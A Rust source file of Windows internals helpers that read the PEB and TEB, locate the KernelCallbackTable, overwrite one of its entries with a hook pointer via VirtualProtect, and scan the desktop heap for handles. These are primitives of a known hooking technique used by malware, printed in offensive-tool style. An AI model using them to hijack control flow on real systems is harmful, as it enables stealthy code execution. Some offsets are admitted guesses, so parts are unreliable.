use std::{
    mem::size_of,
    ffi::c_void
};
use windows::Win32::System::Memory::VirtualProtect;

const fn selectarch() -> bool {
    if cfg!(target_arch = "x86_64") {
        return true
    } else {
        return false
    };
}

//maybe another way to test arch
//fn testarch() -> u16 {
//    let outint: u16;
//    unsafe {
//        asm!("mov eax, cs",
//        "cmp eax, 23h",
//        "cmovne cx, gs",
//        out("cx") outint,
//        );
//    }
//    outint
//}

fn readfsdword(offs: u32) -> usize {
    let outint: usize;
    unsafe {
        asm!("mov {0}, fs:[{1:e}]",
        out(reg) outint,
        in(reg) offs,
        );
    }
    outint
}

fn readgsqword(offs: u32) -> usize {
    let outint: usize;
    unsafe {
        asm!("mov {0}, gs:[{1:e}]",
        out(reg) outint,
        in(reg) offs,
        );
    }
    outint
}

pub fn get_peb() -> *mut c_void {
    let outptr = match selectarch() {
            true => readgsqword(0x60) as *mut c_void,
            false => readfsdword(0x30) as *mut c_void,
    };
    outptr
}

pub fn get_teb() -> *mut c_void {
    let outptr = match selectarch() {
            true => readgsqword(0x30) as *mut c_void,
            false => readfsdword(0x18) as *mut c_void,
    };
    outptr
}

pub unsafe fn get_callback_table(inptr: *mut c_void) -> usize {
    let offset = match selectarch() {
        true => 0x58,
        false => 0x2C,
    };
    let outint: usize = *((inptr as usize + offset) as *const usize);
    outint
}

pub fn patch_callback_table(callbackhook: *mut c_void, callbacktable: *mut c_void, tableoffset: usize) {
    let floldprotect: u32 = 0;
    let flnewprotect: u32 = 4;
    let dwsize = size_of::<usize>();
    unsafe {
        let tableentry: *mut c_void = ((callbacktable as usize) + (dwsize * tableoffset)) as *mut c_void;
        let oldcallback: &mut usize = &mut *(tableentry as *mut usize);
        println!("[+]Old callback table entry: {:#x}", oldcallback);
        let pfloldprotect = (&floldprotect as *const u32) as *mut u32;
        VirtualProtect(tableentry, dwsize, flnewprotect, pfloldprotect);
        asm!("mov [{0}], {1}",
            in(reg) tableentry,
            in(reg) callbackhook,
        );
        VirtualProtect(tableentry, dwsize, floldprotect, pfloldprotect);
        let newcallback: &mut usize = &mut *(tableentry as *mut usize);
        println!("[+]New callback table entry: {:#x}", newcallback);
    }
}

pub unsafe fn get_um_mapped_desktopheap(inptr: *mut c_void) -> usize {
    let offset = match selectarch() {
        true => 0x828,
        //not actually sure for x86
        //might get back to it some time, whatever
        false => 0x828,
    };
    let outint: usize = *((inptr as usize + offset) as *const usize);
    outint
}

pub unsafe fn search_desktopheap(heapbase: *mut c_void, handlevalue: usize) -> usize {
    let mut handleaddr: usize = 0;
    let mut handleoffs: usize = 0;
    let baseaddr: usize = heapbase as usize;
    for i in (0..0xfffff).step_by(8) {
        let seg: usize = *((baseaddr + i) as *const usize);
        if seg == handlevalue {
            handleoffs = i;
            break;
        }
    }
    handleaddr = baseaddr + handleoffs;
    handleaddr
}